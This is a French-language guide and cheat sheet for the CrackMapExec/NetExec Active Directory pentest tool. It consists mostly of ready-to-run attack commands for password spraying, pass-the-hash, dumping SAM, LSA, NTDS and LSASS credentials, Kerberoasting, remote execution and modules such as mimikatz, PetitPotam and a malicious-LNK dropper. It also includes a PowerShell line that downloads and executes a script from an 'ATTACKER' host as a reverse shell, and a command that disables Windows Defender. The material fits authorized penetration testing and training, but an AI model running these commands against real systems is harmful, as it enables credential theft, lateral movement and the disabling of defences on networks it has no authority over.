# 🗡️ CrackMapExec / NetExec - Guide Complet

Le couteau suisse pour le pentest Active Directory et réseau Windows.

---

## 📖 Présentation

**CrackMapExec (CME)** est l'outil de référence pour l'exploitation post-compromission en environnement Windows/AD. **NetExec (nxc)** est son successeur moderne et activement maintenu.

```
Protocoles supportés:
├── SMB (445)
├── WinRM (5985/5986)
├── LDAP (389/636)
├── MSSQL (1433)
├── SSH (22)
├── RDP (3389)
├── WMI (135)
└── FTP (21)
```

---

## 🔧 Installation

```bash
# NetExec (recommandé - successeur de CME)
pip install netexec
# ou
pipx install netexec

# CrackMapExec (legacy)
pip install crackmapexec
# ou
apt install crackmapexec

# Depuis les sources (NetExec)
git clone https://github.com/Pennyw0rth/NetExec.git
cd NetExec
pip install .

# Vérifier l'installation
nxc --version
crackmapexec --version
```

> **Note:** Les exemples utilisent `nxc` (NetExec) mais sont identiques avec `crackmapexec` ou `cme`.

---

## 1️⃣ Énumération SMB

### Scan basique

```bash
# Scanner un hôte
nxc smb TARGET

# Scanner un réseau
nxc smb 192.168.1.0/24

# Scanner une liste
nxc smb targets.txt

# Infos détaillées
nxc smb TARGET --shares --users --groups
```

### Authentification

```bash
# Avec mot de passe
nxc smb TARGET -u user -p password

# Avec hash NTLM (Pass-the-Hash)
nxc smb TARGET -u user -H NTLM_HASH

# Hash complet LM:NT
nxc smb TARGET -u user -H LM:NT

# Null session
nxc smb TARGET -u '' -p ''

# Guest session
nxc smb TARGET -u guest -p ''

# Domain user
nxc smb TARGET -u user -p password -d DOMAIN
```

### Énumération des partages

```bash
# Lister les partages
nxc smb TARGET -u user -p password --shares

# Lister avec permissions
nxc smb TARGET -u user -p password --shares --filter-shares READ WRITE

# Spider un partage (recherche de fichiers)
nxc smb TARGET -u user -p password --spider C$ --pattern .txt,.xml,.config

# Spider avec profondeur
nxc smb TARGET -u user -p password --spider SYSVOL --depth 3
```

### Énumération utilisateurs/groupes

```bash
# Utilisateurs locaux
nxc smb TARGET -u user -p password --users

# Groupes locaux
nxc smb TARGET -u user -p password --groups

# Utilisateurs connectés
nxc smb TARGET -u user -p password --loggedon-users

# Sessions actives
nxc smb TARGET -u user -p password --sessions

# RID cycling (énumération anonyme)
nxc smb TARGET -u '' -p '' --rid-brute
```

### Password Policy

```bash
# Récupérer la politique de mots de passe
nxc smb TARGET -u user -p password --pass-pol
```

---

## 2️⃣ Attaques par Credentials

### Password Spraying

```bash
# Un password, plusieurs users
nxc smb TARGET -u users.txt -p 'Password123!'

# Plusieurs passwords (attention au lockout!)
nxc smb TARGET -u users.txt -p passwords.txt

# Continuer après un succès
nxc smb TARGET -u users.txt -p 'Password123!' --continue-on-success

# Éviter le lockout (1 tentative par user)
nxc smb TARGET -u users.txt -p passwords.txt --no-bruteforce
```

### Credential Validation

```bash
# Tester des credentials
nxc smb TARGET -u user -p password

# Résultat:
# [+] = succès (Pwn3d! si admin)
# [-] = échec

# Tester sur plusieurs machines
nxc smb 192.168.1.0/24 -u user -p password

# Local auth (pas de domaine)
nxc smb TARGET -u user -p password --local-auth
```

### Identification Admin

```bash
# (Pwn3d!) indique des droits admin locaux
nxc smb 192.168.1.0/24 -u admin -p password

# SMB 192.168.1.10 445 DC01 [*] Windows Server 2019
# SMB 192.168.1.10 445 DC01 [+] DOMAIN\admin:password (Pwn3d!)
```

---

## 3️⃣ Extraction de Credentials

### SAM (hashes locaux)

```bash
# Dump SAM (nécessite admin local)
nxc smb TARGET -u admin -p password --sam
```

### LSA Secrets

```bash
# Dump LSA
nxc smb TARGET -u admin -p password --lsa
```

### NTDS.dit (Domain Controller)

```bash
# Dump tous les hashes du domaine
nxc smb DC_IP -u admin -p password --ntds

# Méthode VSS
nxc smb DC_IP -u admin -p password --ntds vss

# Uniquement les hashes actifs
nxc smb DC_IP -u admin -p password --ntds --enabled
```

### LSASS

```bash
# Dump LSASS (credentials en mémoire)
nxc smb TARGET -u admin -p password -M lsassy

# Avec procdump
nxc smb TARGET -u admin -p password -M procdump
# Puis analyser avec mimikatz

# Nanodump
nxc smb TARGET -u admin -p password -M nanodump
```

---

## 4️⃣ Exécution de Commandes

### Méthodes d'exécution

```bash
# Méthode par défaut (wmiexec)
nxc smb TARGET -u admin -p password -x "whoami"

# Via PowerShell
nxc smb TARGET -u admin -p password -X "Get-Process"

# Spécifier la méthode
nxc smb TARGET -u admin -p password -x "whoami" --exec-method smbexec
nxc smb TARGET -u admin -p password -x "whoami" --exec-method atexec
nxc smb TARGET -u admin -p password -x "whoami" --exec-method wmiexec
nxc smb TARGET -u admin -p password -x "whoami" --exec-method mmcexec
```

### Exemples pratiques

```bash
# Énumération système
nxc smb TARGET -u admin -p password -x "systeminfo"
nxc smb TARGET -u admin -p password -x "net user"
nxc smb TARGET -u admin -p password -x "net localgroup administrators"

# PowerShell reverse shell
nxc smb TARGET -u admin -p password -X 'IEX(New-Object Net.WebClient).DownloadString("http://ATTACKER/shell.ps1")'

# Désactiver Windows Defender
nxc smb TARGET -u admin -p password -X "Set-MpPreference -DisableRealtimeMonitoring $true"
```

---

## 5️⃣ Modules

### Lister les modules

```bash
# Tous les modules
nxc smb -L

# Modules LDAP
nxc ldap -L

# Info sur un module
nxc smb -M mimikatz --options
```

### Modules SMB populaires

```bash
# Mimikatz
nxc smb TARGET -u admin -p password -M mimikatz

# WebDAV
nxc smb TARGET -u admin -p password -M webdav

# Slinky (LNK malveillant)
nxc smb TARGET -u admin -p password -M slinky -o SERVER=ATTACKER NAME=Important

# PetitPotam
nxc smb TARGET -u admin -p password -M petitpotam

# noPAC
nxc smb TARGET -u admin -p password -M nopac

# MS17-010 (EternalBlue check)
nxc smb TARGET -M ms17-010

# GPP Passwords
nxc smb TARGET -u user -p password -M gpp_password

# Spider Plus (recherche de fichiers sensibles)
nxc smb TARGET -u admin -p password -M spider_plus

# Enum AV
nxc smb TARGET -u admin -p password -M enum_av
```

### Modules LDAP

```bash
# MAQ (Machine Account Quota)
nxc ldap DC_IP -u user -p password -M maq

# ADCS (certificats)
nxc ldap DC_IP -u user -p password -M adcs

# Get-desc-users (descriptions avec passwords)
nxc ldap DC_IP -u user -p password -M get-desc-users
```

---

## 6️⃣ Protocole LDAP

```bash
# Connexion basique
nxc ldap DC_IP -u user -p password

# Énumérer le domaine
nxc ldap DC_IP -u user -p password --trusted-for-delegation
nxc ldap DC_IP -u user -p password --password-not-required
nxc ldap DC_IP -u user -p password --admin-count
nxc ldap DC_IP -u user -p password --users
nxc ldap DC_IP -u user -p password --groups

# ASREPRoast
nxc ldap DC_IP -u user -p password --asreproast output.txt

# Kerberoasting
nxc ldap DC_IP -u user -p password --kerberoasting output.txt

# Recherche LDAP personnalisée
nxc ldap DC_IP -u user -p password --query "(sAMAccountName=admin)"
```

---

## 7️⃣ Protocole WinRM

```bash
# Test de connexion
nxc winrm TARGET -u user -p password

# Exécution de commandes
nxc winrm TARGET -u user -p password -x "whoami"

# PowerShell
nxc winrm TARGET -u user -p password -X "Get-Process"

# Avec hash
nxc winrm TARGET -u user -H HASH -x "whoami"
```

---

## 8️⃣ Protocole MSSQL

```bash
# Connexion
nxc mssql TARGET -u sa -p password

# Windows auth
nxc mssql TARGET -u user -p password -d DOMAIN

# Exécuter des requêtes
nxc mssql TARGET -u sa -p password -q "SELECT name FROM master.dbo.sysdatabases"

# xp_cmdshell
nxc mssql TARGET -u sa -p password -x "whoami"

# Modules
nxc mssql TARGET -u sa -p password -M mssql_priv
```

---

## 9️⃣ Base de Données CME

```bash
# Accéder à la database
cmedb

# Commandes dans cmedb:
help                    # Aide
hosts                   # Lister les hôtes
creds                   # Lister les credentials
export creds csv        # Exporter en CSV
import creds file.txt   # Importer des creds

# Localisation de la DB
~/.nxc/workspaces/default/smb.db
```

---

## 🔟 Cas d'Usage Pratiques

### Workflow complet de pentest

```bash
# 1. Découverte réseau
nxc smb 192.168.1.0/24

# 2. Null session check
nxc smb 192.168.1.0/24 -u '' -p '' --shares

# 3. Password spray (après avoir récupéré des users)
nxc smb DC_IP -u users.txt -p 'Company2024!' --continue-on-success

# 4. Identifier les admins locaux
nxc smb 192.168.1.0/24 -u validuser -p 'Company2024!'
# Chercher (Pwn3d!)

# 5. Dump des credentials
nxc smb TARGET -u admin -p password --sam
nxc smb DC_IP -u domainadmin -p password --ntds

# 6. Pass-the-Hash latéral
nxc smb 192.168.1.0/24 -u Administrator -H HASH
```

### Recherche de quick wins

```bash
# GPP Passwords
nxc smb DC_IP -u user -p password -M gpp_password

# Descriptions avec passwords
nxc ldap DC_IP -u user -p password -M get-desc-users

# Comptes AS-REP roastable
nxc ldap DC_IP -u user -p password --asreproast asrep.txt

# Comptes Kerberoastable
nxc ldap DC_IP -u user -p password --kerberoasting kerb.txt

# Fichiers sensibles
nxc smb TARGET -u user -p password --spider SYSVOL --pattern password,cred,secret
```

---

## 📋 Cheatsheet Rapide

```bash
# Scan
nxc smb 192.168.1.0/24
nxc smb TARGET -u user -p password --shares --users

# Password Spray
nxc smb TARGET -u users.txt -p 'Password123!'

# Pass-the-Hash
nxc smb TARGET -u user -H HASH

# Dump SAM
nxc smb TARGET -u admin -p password --sam

# Dump NTDS (DC)
nxc smb DC -u admin -p password --ntds

# Execution
nxc smb TARGET -u admin -p password -x "whoami"
nxc smb TARGET -u admin -p password -X "Get-Process"

# Kerberos attacks
nxc ldap DC -u user -p password --asreproast out.txt
nxc ldap DC -u user -p password --kerberoasting out.txt

# Modules
nxc smb TARGET -u admin -p password -M lsassy
nxc smb TARGET -u admin -p password -M mimikatz
```

---

## 📚 Ressources

- **NetExec GitHub** : https://github.com/Pennyw0rth/NetExec
- **CrackMapExec GitHub** : https://github.com/byt3bl33d3r/CrackMapExec
- **Wiki** : https://www.netexec.wiki/
- **Cheatsheet** : https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/

---

**Tags:** `#crackmapexec #netexec #activedirectory #smb #passthehash #passwordspray #lateral-movement #windows`
